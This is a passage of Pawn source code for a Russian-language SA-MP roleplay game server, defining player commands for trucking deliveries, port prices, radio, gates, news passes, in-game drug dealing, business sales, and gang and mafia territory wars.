				if(togran[playerid] > gettime()+1) return SCM(playerid,COLOR_GREY," Извините, мы вас немного задержим, в порту нет места");
				PTEMP[playerid][pCash] += PTEMP[playerid][pDgruz]*Sellbenz[0];
				if(booston == 0) PTEMP[playerid][pDExp] += 400+PTEMP[playerid][pDgruz]*200;
				else if(booston == 1) PTEMP[playerid][pDExp] += 400+PTEMP[playerid][pDgruz]*600;
				format(YCMDstr, sizeof(YCMDstr), " {00D26D}Вы доставили %d т.груза на сумму %i вирт",PTEMP[playerid][pDgruz],Sellbenz[0]*PTEMP[playerid][pDgruz]);
				SCM(playerid, 0x66FBA6FF, YCMDstr);
				if(Sellbenz[0] != 200) Sellbenz[0] -= 100;
				if(Sellbenz[1] != 900) Sellbenz[1] += 100;
				format(string, sizeof(string), "Порт ЛС\nНефть: %d\nУголь: %d\nДерево: %d",Sellbenz[0],Sellugol[0],Sellderevo[0]);
				Update3DTextLabelText(Doki[0],0xFFFF00FF,string);
				format(string, sizeof(string), "Порт СФ\nНефть: %d\nУголь: %d\nДерево: %d",Sellbenz[1],Sellugol[1],Sellderevo[1]);
				Update3DTextLabelText(Doki[1],0xFFFF00FF,string);
				togran[playerid] = gettime()+180;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 10.0, -1731.4509,118.9413,3.5547))
			{
				if(togran[playerid] > gettime()+1) return SCM(playerid,COLOR_GREY,"Извините, мы вас немного задержим, в порту нет места");
				PTEMP[playerid][pCash] += PTEMP[playerid][pDgruz]*Sellbenz[1];
				if(booston == 0) PTEMP[playerid][pDExp] += 400+PTEMP[playerid][pDgruz]*200;
				else if(booston == 1) PTEMP[playerid][pDExp] += 400+PTEMP[playerid][pDgruz]*600;
				format(YCMDstr, sizeof(YCMDstr), " {00D26D}Вы доставили %d т.груза на сумму %i вирт",PTEMP[playerid][pDgruz],Sellbenz[1]*PTEMP[playerid][pDgruz]);
				SCM(playerid, 0x66FBA6FF, YCMDstr);
				if(Sellbenz[1] != 200) Sellbenz[1] -= 100;
				if(Sellbenz[0] != 900) Sellbenz[0] += 100;
				format(string, sizeof(string), "Порт ЛС\nНефть: %d\nУголь: %d\nДерево: %d",Sellbenz[0],Sellugol[0],Sellderevo[0]);
				Update3DTextLabelText(Doki[0],0xFFFF00FF,string);
				format(string, sizeof(string), "Порт СФ\nНефть: %d\nУголь: %d\nДерево: %d",Sellbenz[1],Sellugol[1],Sellderevo[1]);
				Update3DTextLabelText(Doki[1],0xFFFF00FF,string);
				togran[playerid] = gettime()+180;
			}
		}
	case 2:
		{
			if(IsPlayerInRangeOfPoint(playerid, 7.0, 2601.7222,-2226.5867,13.3732))
			{
				if(togran[playerid] > gettime()+1) return SCM(playerid,COLOR_GREY,"Извините, мы вас немного задержим, в порту нет места");
				PTEMP[playerid][pCash] += PTEMP[playerid][pDgruz]*Sellugol[0];
				if(booston == 0) PTEMP[playerid][pDExp] += 400+PTEMP[playerid][pDgruz]*200;
				else if(booston == 1) PTEMP[playerid][pDExp] += 400+PTEMP[playerid][pDgruz]*600;
				format(YCMDstr, sizeof(YCMDstr), " {00D26D}Вы доставили %d т.груза на сумму %i вирт",PTEMP[playerid][pDgruz],Sellugol[0]*PTEMP[playerid][pDgruz]);
				SCM(playerid, 0x66FBA6FF, YCMDstr);
				if(Sellugol[0] != 200) Sellugol[0] -= 100;
				if(Sellugol[1] != 900) Sellugol[1] += 100;
				format(string, sizeof(string), "Порт ЛС\nНефть: %d\nУголь: %d\nДерево: %d",Sellbenz[0],Sellugol[0],Sellderevo[0]);
				Update3DTextLabelText(Doki[0],0xFFFF00FF,string);
				format(string, sizeof(string), "Порт СФ\nНефть: %d\nУголь: %d\nДерево: %d",Sellbenz[1],Sellugol[1],Sellderevo[1]);
				Update3DTextLabelText(Doki[1],0xFFFF00FF,string);
				togran[playerid] = gettime()+180;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 7.0, -1731.4509,118.9413,3.5547))
			{
				if(togran[playerid] > gettime()+1) return SCM(playerid,COLOR_GREY,"Извините, мы вас немного задержим, в порту нет места");
				PTEMP[playerid][pCash] += PTEMP[playerid][pDgruz]*Sellugol[1];
				if(booston == 0) PTEMP[playerid][pDExp] += 400+PTEMP[playerid][pDgruz]*200;
				else if(booston == 1) PTEMP[playerid][pDExp] += 400+PTEMP[playerid][pDgruz]*600;
				format(YCMDstr, sizeof(YCMDstr), " {00D26D}Вы доставили %d т.груза на сумму %i вирт",PTEMP[playerid][pDgruz],Sellugol[1]*PTEMP[playerid][pDgruz]);
				SCM(playerid, 0x66FBA6FF, YCMDstr);
				if(Sellugol[1] != 200) Sellugol[1] -= 100;
				if(Sellugol[0] != 900) Sellugol[0] += 100;
				format(string, sizeof(string), "Порт ЛС\nНефть: %d\nУголь: %d\nДерево: %d",Sellbenz[0],Sellugol[0],Sellderevo[0]);
				Update3DTextLabelText(Doki[0],0xFFFF00FF,string);
				format(string, sizeof(string), "Порт СФ\nНефть: %d\nУголь: %d\nДерево: %d",Sellbenz[1],Sellugol[1],Sellderevo[1]);
				Update3DTextLabelText(Doki[1],0xFFFF00FF,string);
				togran[playerid] = gettime()+180;
			}
		}
	case 3:
		{
			if(IsPlayerInRangeOfPoint(playerid, 7.0, 2601.7222,-2226.5867,13.3732))
			{
				if(togran[playerid] > gettime()+1) return SCM(playerid,COLOR_GREY,"Извините, мы вас немного задержим, в порту нет места");
				PTEMP[playerid][pCash] += PTEMP[playerid][pDgruz]*Sellderevo[0];
				if(booston == 0) PTEMP[playerid][pDExp] += 400+PTEMP[playerid][pDgruz]*200;
				else if(booston == 1) PTEMP[playerid][pDExp] += 400+PTEMP[playerid][pDgruz]*600;
				format(YCMDstr, sizeof(YCMDstr), " {00D26D}Вы доставили %d т.груза на сумму %i вирт",PTEMP[playerid][pDgruz],Sellderevo[0]*PTEMP[playerid][pDgruz]);
				SCM(playerid, 0x66FBA6FF, YCMDstr);
				if(Sellderevo[0] != 200) Sellderevo[0] -= 100;
				if(Sellderevo[1] != 900) Sellderevo[1] += 100;
				format(string, sizeof(string), "Порт ЛС\nНефть: %d\nУголь: %d\nДерево: %d",Sellbenz[0],Sellugol[0],Sellderevo[0]);
				UpdateDynamic3DTextLabelText(Doki[0],0xFFFF00FF,string);
				format(string, sizeof(string), "Порт СФ\nНефть: %d\nУголь: %d\nДерево: %d",Sellbenz[1],Sellugol[1],Sellderevo[1]);
				UpdateDynamic3DTextLabelText(Doki[1],0xFFFF00FF,string);
				togran[playerid] = gettime()+180;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 7.0, -1731.4509,118.9413,3.5547))
			{
				if(togran[playerid] > gettime()+1) return SCM(playerid, COLOR_GREY, " Извините, мы вас немного задержим, в порту нет места");
				PTEMP[playerid][pCash] += PTEMP[playerid][pDgruz]*Sellderevo[1];
				if(booston == 0) PTEMP[playerid][pDExp] += 400+PTEMP[playerid][pDgruz]*200;
				else if(booston == 1) PTEMP[playerid][pDExp] += 400+PTEMP[playerid][pDgruz]*600;
				format(YCMDstr, sizeof(YCMDstr), " {00D26D}Вы доставили %d т.груза на сумму %i вирт",PTEMP[playerid][pDgruz],Sellderevo[1]*PTEMP[playerid][pDgruz]);
				SCM(playerid, 0x66FBA6FF, YCMDstr);
				if(Sellderevo[1] != 200) Sellderevo[1] -= 100;
				if(Sellderevo[0] != 900) Sellderevo[0] += 100;
				format(string, sizeof(string), "Порт ЛС\nНефть: %d\nУголь: %d\nДерево: %d",Sellbenz[0],Sellugol[0],Sellderevo[0]);
				UpdateDynamic3DTextLabelText(Doki[0],0xFFFF00FF,string);
				format(string, sizeof(string), "Порт СФ\nНефть: %d\nУголь: %d\nДерево: %d",Sellbenz[1],Sellugol[1],Sellderevo[1]);
				UpdateDynamic3DTextLabelText(Doki[1],0xFFFF00FF,string);
				togran[playerid] = gettime()+180;
			}
		}
	}
	peremennn[playerid] = 0;
	bGruz[playerid] = 0;
	DestroyVehicle(GetVehicleTrailer(GetPlayerVehicleID(playerid)));
	Expirence(playerid);
	DriverJob[playerid] = false;
	PTEMP[playerid][pDgruz] = 0;
	Gruz[playerid] = 0;
	return true;
}
CMD:tskill(playerid)
{
	peremennn[playerid] = 0;
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pJob] != 99)return SCM(playerid,COLOR_GREY, " Вы не Дальнобойщик");
	new gtext[7];
	switch(Gruz[playerid])
	{
	case 1: gtext ="Нефть";
	case 2: gtext ="Уголь";
	case 3: gtext ="Дерево";
	case 0: gtext ="Нет";
	}
	new gaatext[7];
	switch(PTEMP[playerid][pDLevel])
	{
	case 1..4: gaatext ="11т";
	case 5..14: gaatext ="21т.";
	case 15..24: gaatext ="35т.";
	case 25..26: gaatext ="50т.";
	}
	new level = PTEMP[playerid][pDLevel];
	new exp = PTEMP[playerid][pDExp];
	new expamount = level*levelDexp;
	new gruz = PTEMP[playerid][pDgruz];
	new mazgruz = PTEMP[playerid][pDMgruz];
	new msg[] = "Навык:\n\tLVL: %i\n\tExp: %i / %i\nФура:\n\tМакс груз: %iт.\n\tЗагружено: %iт. из %s\nГруз: %s";
	format(YCMDstr, 128, msg,level,exp,expamount,mazgruz,gruz,gaatext,gtext);
	ShowPlayerDialogEx(playerid,31999,0, "Статистика Дальнобойщика",YCMDstr, "Готово", "");
	return true;
}
CMD:queststats(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	QuestStats(playerid,playerid);
	return true;
}
CMD:tmonitor(playerid, params[])
{
	peremennn[playerid] = 0;
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pJob] != 99)return SCM(playerid,COLOR_GREY, " Вы не Дальнобойщик");
	if(!IsAtTPlace(playerid)) return SCM(playerid,0x81DA99AA," Вы должны находиться в порту, или на складе");
	new msg1[] = "[Заводы]\nНефтезавод №1 Цена 1т: \n\t%i\nНефтезавод №2 Цена 1т: \n\t%i\nСклад угля №1 Цена 1т: \n\t%i\nСклад угля №2 Цена 1т:\n\t%i\nЛесопилка №1 Цена 1т:\n\t%i\nЛесопилка №2 Цена 1т: \n\t%i\n\n[Порты]\nПорт ЛС, Цена 1т:\n\tНефть: %i\n\tУголь: %i\n\tДерево: %i\nПорт СФ, Цена 1т:\n\tНефть: %i\n\tУголь: %i\n\tДерево: %i";
	format(YCMDstr, 500, msg1,Benzbuy[0],Benzbuy[1],ugolbuy[0],ugolbuy[1],Buyderevo[0],Buyderevo[1],Sellbenz[0],Sellugol[0],Sellderevo[0],Sellbenz[1],Sellugol[1],Sellderevo[1]);
	ShowPlayerDialogEx(playerid,31998,0, "Сообщение",YCMDstr, "Выбрать", "Назад");
	return true;
}
CMD:taxiskill(playerid)
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	format(YCMDstr, sizeof(YCMDstr), " Ваш уровень таксиста %i. До следующего осталось %i/%i exp",PTEMP[playerid][ptaxilvl], PTEMP[playerid][ptaxiexp], PTEMP[playerid][ptaxilvl]*8);
	SCM(playerid, COLOR_BLUE, YCMDstr);
	return true;
}
CMD:radio(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(sscanf(params, "d", params[0]))
	{
		SCM(playerid, -1, " Введите: /switchwave [номер]");
		SCM(playerid, -1, " [0] Выключить");
		SCM(playerid, -1, " [1] SF News");
		SCM(playerid, -1, " [2] LS News");
		SCM(playerid, -1, " [3] LV News");
		return true;
	}
	switch (params[0])
	{
	case 1:
		{
			lNews[playerid] = 1;
			gNews[playerid] = 0;
			LvNews[playerid] = 1;
			SCM(playerid, -1, " Волна переключена на SF News");
		}
	case 2:
		{
			lNews[playerid] = 0;
			gNews[playerid] = 1;
			LvNews[playerid] = 1;
			SCM(playerid, -1, " Волна переключена на LS News");
		}
	case 3:
		{
			lNews[playerid] = 1;
			gNews[playerid] = 1;
			LvNews[playerid] = 0;
			SCM(playerid, -1, " Волна переключена на LV News");
		}
	case 0:
		{
			lNews[playerid] = 1;
			gNews[playerid] = 1;
			LvNews[playerid] = 1;
			SCM(playerid, -1, " Радио отключено");
		}
	}
	return true;
}
CMD:instopen(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pMember] != 11 && PTEMP[playerid][pLeader] != 11 && TakingLesson[playerid] != 1) return SCM(playerid, COLOR_GREY, " Вам недоступна эта функция");
	if(!PlayerToPoint(8.0,playerid,-2074.50000000,-94.90000153,35.00000000)) return true;
	MoveObject(licgate, -2074.50000000,-94.90000153,35.00000000+0.020,0.020, 0.00,0.00,90.00);
	SetTimer("LicClose", 8000, 0);
	SCM(playerid, 0x6495EDFF, " Шлакбаум опустится через 8 секунд");
	return true;
}
CMD:prodopen(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pJob] != 5) return true;
	if(!PlayerToPoint(10.0,playerid,2203.8630371094,-2252.1179199219,13.5)) return true;
	MoveObject(gruzgate, 2203.7639160156,-2252.0598117188,13.40+0.120,0.120, 0.00,0.00,316.00);
	SetTimer("GruzClose", 8000, 0);
	SCM(playerid, 0x6495EDFF, " Шлакбаум опустится через 8 секунд");
	return true;
}
CMD:myhouse(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 10) return true;
	if(!PlayerToPoint(20.0,playerid,227.54, 1030.38, 1084.01)) return true;
	if(modern)
	{
	    SCM(playerid, -1, " Вы убрали Modern-панель дома");
		MoveObject(modernhouse[0], 231.84, 1028.48, 1081.11, 0.5, 0, 0, 0); // down
		MoveObject(modernhouse[1], 231.84, 1034.01, 1081.11, 0.5, 0, 0, 0);
		MoveObject(modernhouse[2], 231.84, 1035.60, 1081.11, 0.5, 0, 0, 0);
		MoveObject(modernhouse[3], 231.13, 1031.17, 1079.75, 0.5, 0, 0, -90);
		MoveObject(modernhouse[4], 231.13, 1033.43, 1079.75, 0.5, 0, 0, -90);
		MoveObject(modernhouse[5], 231.13, 1026.95, 1079.75, 0.5, 0, 0, -90);
		MoveObject(modernhouse[6], 227.06, 1036.37, 1081.11, 0.5, 0, 0, 90);
		MoveObject(modernhouse[7], 229.13, 1035.73, 1079.75, 0.5, 0, 0, 0);
		MoveObject(modernhouse[8], 226.16, 1035.73, 1079.75, 0.5, 0, 0, 0);
		MoveObject(modernhouse[9], 225.21, 1036.27, 1082.15, 0.5, 0, 0, 0);
		MoveObject(modernhouse[10], 231.72, 1030.21, 1081.17, 0.5, 0, 0, -90);

		MoveObject(modernhouse[11], 218.88, 1036.37, 1087.79, 1.0, 0, 0, 90); // left
		MoveObject(modernhouse[12], 220.55, 1036.22, 1088.64, 1.0, 0, 0, 0);
		
		MoveObject(modernhouse[13], 230.17, 1026.02, 1092.56, 0.5, 0, 0, 0); // up
		MoveObject(modernhouse[14], 230.18, 1033.29, 1092.61, 0.5, 0, 0, 0);
		MoveObject(modernhouse[15], 225.47, 1036.37, 1094.90, 0.5, 0, 0, 90);
		
		MoveObject(modernhouse[16], 231.39, 1022.07, 1082.98, 0.5, 0, 0, 42.40); // rigth
		modern = false;
	}
	else
	{
	    SCM(playerid, -1, " Вы вернули Modern-панель дома");
		MoveObject(modernhouse[0], 231.84, 1028.48, 1084.35, 0.5, 0, 0, 0); // down
		MoveObject(modernhouse[1], 231.84, 1034.01, 1084.35, 0.5, 0, 0, 0);
		MoveObject(modernhouse[2], 231.84, 1035.60, 1084.35, 0.5, 0, 0, 0);
		MoveObject(modernhouse[3], 231.13, 1031.17, 1082.98, 0.5, 0, 0, -90);
		MoveObject(modernhouse[4], 231.13, 1033.43, 1082.98, 0.5, 0, 0, -90);
		MoveObject(modernhouse[5], 231.13, 1026.95, 1082.98, 0.5, 0, 0, -90);
		MoveObject(modernhouse[6], 227.06, 1036.37, 1084.35, 0.5, 0, 0, 90);
		MoveObject(modernhouse[7], 229.13, 1035.73, 1082.98, 0.5, 0, 0, 0);
		MoveObject(modernhouse[8], 226.16, 1035.73, 1082.98, 0.5, 0, 0, 0);
		MoveObject(modernhouse[9], 225.21, 1036.27, 1085.38, 0.5, 0, 0, 0);
		MoveObject(modernhouse[10], 231.72, 1030.21, 1084.41, 0.5, 0, 0, -90);
		
	 	MoveObject(modernhouse[11], 225.47, 1036.37, 1087.79, 1.0, 0, 0, 90); // left
	 	MoveObject(modernhouse[12], 227.14, 1036.22, 1088.64, 1.0, 0, 0, 0);
		
		MoveObject(modernhouse[13], 230.17, 1026.02, 1088.89, 0.5, 0, 0, 0); // up
		MoveObject(modernhouse[14], 230.18, 1033.29, 1088.94, 0.5, 0, 0, 0);
		MoveObject(modernhouse[15], 225.47, 1036.37, 1091.23, 0.5, 0, 0, 90);
		
		MoveObject(modernhouse[16], 231.39, 1024.07, 1082.98, 0.5, 0, 0, 42.40); // rigth
		modern = true;
		printf("Администратор %s вернул Modern-панель дома", Name(playerid));
	}
	return true;
}
CMD:givenewskeys(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(sscanf(params, "u", params[0])) return SCM(playerid, -1, " Введите: /givenewskeys [id]");
	if(PTEMP[playerid][pMember] == 9 || PTEMP[playerid][pMember] == 16 || PTEMP[playerid][pMember] == 20 || PTEMP[playerid][pAdmin] >= 1)
	{
		if(!IsPlayerConnected(params[0])) return true;
		if(params[0] == INVALID_PLAYER_ID) return true;
		if(PTEMP[params[0]][pNkeys] >= 1)
		{
			PTEMP[params[0]][pNkeys] = 0;
			format(YCMDstr, sizeof(YCMDstr), " %s забрал пропуск у %s в студию новостей",PTEMP[playerid][pName],Name(params[0]));
		}
		else
		{
			if(PTEMP[playerid][pAdmin] >= 1) PTEMP[params[0]][pNkeys] = 1;
			else PTEMP[params[0]][pNkeys] = PTEMP[playerid][pMember];
			format(YCMDstr, sizeof(YCMDstr), " %s выдал пропуск %s в студию новостей",PTEMP[playerid][pName],Name(params[0]));
		}
		ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	} else SCM(playerid, 0xafafafaa, " Вам недоступна эта функция!");
	return true;
}
CMD:npanel(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0 || !GetPVarInt(playerid,"Fraction_Duty")) return true;
	new model = GetVehicleModel(GetPlayerVehicleID(playerid));
	if(model != 582 && model != 488 &&  !PlayerToPoint(30.0,playerid,2648.8855,1224.7946,41.0859) && !PlayerToPoint(30.0,playerid,-2052.6719,473.1645,191.0859) && !PlayerToPoint(30.0,playerid,1656.0978,-1623.1172,101.0859)) return SCM(playerid, COLOR_GRAD1, " Вы не в репортёрской машине / вертолёте / офисе!");
 	if(PTEMP[playerid][pMember] == 9 || PTEMP[playerid][pMember] == 16 || PTEMP[playerid][pMember] == 20)
 	    ShowPlayerDialogEx(playerid, 2223, DIALOG_STYLE_LIST, "Меню репортёра", "[0] Прямой эфир\n[1] Выйти из прямого эфира\n[2] Начать принимать звонки/смс\n[3] Завершить принимать звонки/смс\n[4] Взять интервью\n[5] Завершить интервью\n[6] Объявления\n[7] Банк\n[8] Раздел лидера\n[9] Голосование", "Выбор", "Отмена");
 	else return SCM(playerid, COLOR_GREY, " Вы не репортер!");
	return true;
}
CMD:selldrugs(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsAGang(playerid)) return SCM(playerid,COLOR_GREY," Вы не бандит");
	if(sscanf(params, "udd", params[0],params[1],params[2])) return SCM(playerid, -1, " Введите: /selldrugs [id] [кол-во] [Цена]");
	if(params[1] < 1 || params[1] > 150) { SCM(playerid, COLOR_GREY, " Вес не может быть меньше 1 и больше 150!"); return true; }
	if(params[2] < 1 || params[2] > 5000) { SCM(playerid, COLOR_GREY, " Цена не может быть меньше 1 и больше 5000 вирт!"); return true; }
	if(params[1] > PTEMP[playerid][pDrugs]) { SCM(playerid, COLOR_GREY, " У вас нет столько наркотиков!"); return true; }
	if(!IsPlayerConnected(params[0])) return true;
	if(!ProxDetectorS(8.0, playerid, params[0])) return SCM(playerid,COLOR_GREY," Вы должны находиться рядом друг с другом");
	if(params[0] == playerid) return SCM(playerid, COLOR_GREY, " Вы не можете продать себе наркотики!");
	format(YCMDstr, sizeof(YCMDstr), " Вы предложили %s купить %i грамм наркоты за %i вирт",Name(params[0]),params[1],params[2]);
	SCM(playerid, 0x6495EDFF, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " %s предлагает вам купить %i грам наркоты за %i вирт. (( Введите /accept drugs для покупки ))",PTEMP[playerid][pName],params[1],params[2]);
	SCM(params[0], 0x6495EDFF, YCMDstr);
	SetPVarInt(playerid,"Offer",params[0]);
	DrugOffer[params[0]] = playerid;
	DrugPrice[params[0]] = params[2];
	DrugGram[params[0]] = params[1];
	return true;
}
CMD:quitjob(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pJob] == 65 && avtocar[playerid] > 0) PTEMP[playerid][pSkilla]--;
	PTEMP[playerid][pJob] = 0;
	SCM(playerid, -1, " Вы уволились");
	printf("Игрок %s уволился с работы", Name(playerid));
	return true;
}
CMD:sellbiz(playerid)
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsPlayerConnected(playerid)) return true;
	if(!BGet(playerid)) return SCM(playerid, COLOR_GREY, " Вы не владеете бизнесом");
	new bouse = PTEMP[playerid][pPBizzKey];
	if(strcmp(PTEMP[playerid][pName], BizzInfo[PTEMP[playerid][pPBizzKey]][bOwner], true) == 0)
	{
		if(PlayerToPoint(5, playerid,BizzInfo[bouse][bEntranceX], BizzInfo[bouse][bEntranceY], BizzInfo[bouse][bEntranceZ]) || PlayerToPoint(5, playerid,BizzInfo[bouse][bBarX], BizzInfo[bouse][bBarY], BizzInfo[bouse][bBarZ]))
		{
			BizzInfo[bouse][bLocked] = 1;
			BizzInfo[bouse][bProducts] = 0;
			strmid(BizzInfo[bouse][bOwner], "None", 0, strlen("None"), 32);
			PTEMP[playerid][pBank] +=BizzInfo[bouse][bTill]+BizzInfo[bouse][bLandTax];
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			format(string,40,"~w~business in sold~n~~g~$%i",BizzInfo[bouse][bTill]+BizzInfo[bouse][bLandTax]);
			GameTextForPlayer(playerid,string, 5000, 3);
			BizzInfo[bouse][bTill] = 0;
			BizzInfo[bouse][bPrice] = 0;
			BizzInfo[bouse][bMafia] = 0;
			BizzInfo[bouse][bLandTax] = 0;
			BizzPay[bouse] = 0;
			BizzInfo[bouse][bLicense] = 0;
			BGet(playerid);
			format(YCMDstr, sizeof(YCMDstr), "%s\nПродаётся", BizzInfo[bouse][bMessage],BizzInfo[bouse][bBuyPrice]);
			UpdateDynamic3DTextLabelText(BizzInfo[bouse][bLabel], COLOR_GREEN, YCMDstr);
			printf("Игрок %s продал свой бизнес", Name(playerid));
			return true;
		}
	}
	return true;
}
CMD:capture(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(Flood[playerid] > 0 && PTEMP[playerid][pAdmin] <= 6) return SCM(playerid, 0xFFD5BBAA, " Не флуди!");
	Flood[playerid] = 1;
	if(IsABiker(playerid))
	{
		new YCMDstrs[2048];
	    if(PTEMP[playerid][pRank] < 7) return SCM(playerid, COLOR_GREY, " Доступно с 7 ранга");
	    format(YCMDstrs, sizeof(YCMDstrs), "");//"Объект\tБайкеры\n");
	    for(new i = 1; i <= TOTALFARM; i++)
	    {
			if(FarmInfo[i][isCaptured]) format(string, sizeof(string), "{FF0000}Ферма №%i [%s]\n", i-1, GetNameOfBiker(FarmInfo[i][fBiker]));
			else format(string, sizeof(string), "{FFFFFF}Ферма №%i [%s]\n", i-1, GetNameOfBiker(FarmInfo[i][fBiker]));
			strcat(YCMDstrs, string);
		}
		for(new i = 1; i <= TOTALSHOPS; i++)
		{
		    if(WorkshopInfo[i][isCaptured]) format(string, sizeof(string), "{FF0000}Мастерская №%i [%s]\n", i-1, GetNameOfBiker(WorkshopInfo[i][wBiker]));
			else format(string, sizeof(string), "{FFFFFF}Мастерская №%i [%s]\n", i-1, GetNameOfBiker(WorkshopInfo[i][wBiker]));
			strcat(YCMDstrs, string);
		}
		ShowPlayerDialogEx(playerid, 19270, DIALOG_STYLE_LIST, "Выберите объект", YCMDstrs, "Атаковать", "Отмена");
	}
	else if(IsAGang(playerid))
	{
		if(FrakCD[PTEMP[playerid][pMember]] != 0) return SCM(playerid,COLOR_GREY," Ваша банда уже воюет / воевала за территорию в этом часу.");
		if(!IsInAllowed(playerid)) return SCM(playerid,COLOR_GRAD1, " Данная команда доступна с 7 ранга");
		new tmphour, tmpminute, tmpsecond;
		gettime(tmphour, tmpminute, tmpsecond);
		tmphour = shifthour;
		for(new i = 1; i <= TOTALGZ; i++)
		{
			if(PlayerToKvadrat(playerid,GZInfo[i][gCoords][0], GZInfo[i][gCoords][1],GZInfo[i][gCoords][2],GZInfo[i][gCoords][3]) && GZInfo[i][gFrakVlad] != PTEMP[playerid][pMember] && ZoneOnBattle[i]==0)
			{
				new playerss = 0;
				foreach(m)
				{
					if(PTEMP[m][pMember] == GZInfo[i][gFrakVlad]) playerss++;
				}
				if(playerss == 0) return SCM(playerid, COLOR_GREY, " Игроки этой банды отсутствуют");
				if(FrakCD[GZInfo[i][gFrakVlad]] != 0) return SCM(playerid,COLOR_GRAD1," Нападаемая банда уже воюет / воевала за территорию в этом часу");
				if(IsARespawn(playerid)) return SCM(playerid,-1," Нельзя захватить эту территорию");
				FrakCD[GZInfo[i][gFrakVlad]] = 1;
				FrakCD[PTEMP[playerid][pMember]] = 1;
				format(YCMDstr,sizeof(YCMDstr), " [Внимание]: Ваша банда напала на территорию %s. Инициировал(а) %s",GetGangName(GZInfo[i][gFrakVlad]), Name(playerid));
				SendFamilyMessage(PTEMP[playerid][pMember],0x00B953AA,YCMDstr);
				format(YCMDstr,sizeof(YCMDstr), " [Внимание]: На вашу территорию напала банда %s",GetGangName(PTEMP[playerid][pMember]));
				SendFamilyMessage(GZInfo[i][gFrakVlad],0xFF8CEFAA,YCMDstr);
				GangZoneFlashForAll(GZInfo[i][gZone],GetGZColorF(PTEMP[playerid][pMember]));
				SCM(playerid,-1," Территория будет мигать 10 минут. Победит банда, которая останется последней");
				SCM(playerid,-1," Территория будет мигать до тех пор, пока на ней не останется 1 банда");
				new str[64];
				switch(GZInfo[i][gFrakVlad])
				{
				case 12: str="Ballas";
				case 13: str="Vagos";
				case 15: str="Grove";
				case 17: str="Aztecas";
				case 18: str="Rifa";
				}
				switch(PTEMP[playerid][pMember])
				{
				case 12: str2="Ballas";
				case 13: str2="Vagos";
				case 15: str2="Grove";
				case 17: str2="Aztecas";
				case 18: str2="Rifa";
				}
				format(string,128," {BEBEBE}Банда %s напала на банду %s.",str2,str);
				SendAdminMessage(0x00a86bAA,string);
				GZSafeTime[i] = 600;
				GZInfo[i][gNapad] = PTEMP[playerid][pMember];
				ZoneOnBattle[i] = 1;
				if(playerss == 0) GZSafeTime[i] = 0;
				break;
			}
		}
	}
	return true;
}
CMD:mafiawar(playerid, params[])
{
	if(!PTEMP[playerid][pLogin] || !IsAMafia(playerid) || PTEMP[playerid][pRank] < 6) return SCM(playerid, COLOR_GREY, " Вам недоступна эта функция");
	if(WarStart > 0) return SCM(playerid, COLOR_GREY," В данное время нельзя начать войну!");
	if(sscanf(params, "d",params[0x0]) || params[0x0] < 1 || params[0x0] > 2) return SCM(playerid, -1," Введите: /mafiawar [id стрелы (1 - Заброшенный аэропорт | 2 - Карьер)]");
	for(new b = 1; b <= TotalBizz; b++)
	{
		if(PlayerToPoint(3, playerid,BizzInfo[b][bEntranceX], BizzInfo[b][bEntranceY], BizzInfo[b][bEntranceZ]) && BizzInfo[b][bMafia] != PTEMP[playerid][pMember])
		{
			if(BizzInfo[b][bMafia] == 0) return BizzInfo[b][bMafia] = PTEMP[playerid][pMember], SCM(playerid, COLOR_GREY, " Бизнес взят под контроль");
			WarStart = 7200;
			format(YCMDstr,144, " Вы набили стрелку %s. Бизнес: %s. Место встречи: Территория [ID %i]",GetMafiaName(BizzInfo[b][bMafia]), BizzInfo[b][bMessage],params[0x0]);
			SendFamilyMessage(PTEMP[playerid][pMember],0x114D71AA,YCMDstr);
			SendFamilyMessage(PTEMP[playerid][pMember],0x114D71AA, "Встреча через 20 минут");
			format(YCMDstr,144, " %s набила вам стрелку. Бизнес: %s. Место встречи: Территория [ID %i]",GetMafiaName(PTEMP[playerid][pMember]),BizzInfo[b][bMessage],params[0x0]);
			SendFamilyMessage(BizzInfo[b][bMafia],COLOR_RED,YCMDstr);
			SendFamilyMessage(BizzInfo[b][bMafia],COLOR_RED, " Встреча через 20 минут");
			BizzInfo[b][bCapture] = PTEMP[playerid][pMember];
			MFrakCD[PTEMP[playerid][pMember]] = 1200;
			MFrakCD[BizzInfo[b][bMafia]] = 1200;
			ZoneID = params[0x0];
			ZoneTimer = 2000;
			if(ZoneID == 1) ZoneWar = GangZoneCreate(351.314666, 2455.576416, 439.314666, 2551.576416);
			else if(ZoneID == 2) ZoneWar = GangZoneCreate(393.8914,983.9361, 324.6188,833.3795);
			else ZoneWar = GangZoneCreate(-789.8281,2015.9144, -662.7654,2083.9297);
			GangZoneShowForAll(ZoneWar, 0xB2B2B2AA);
			GangZoneFlashForAll(ZoneWar,COLOR_RED);
			MzCheckTimer = SetTimer("MzCheck", 1000,1);
		}
	}
	return true;
}
CMD:bizlist(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsAMafia(playerid)) return true;
	new strrr[1000];
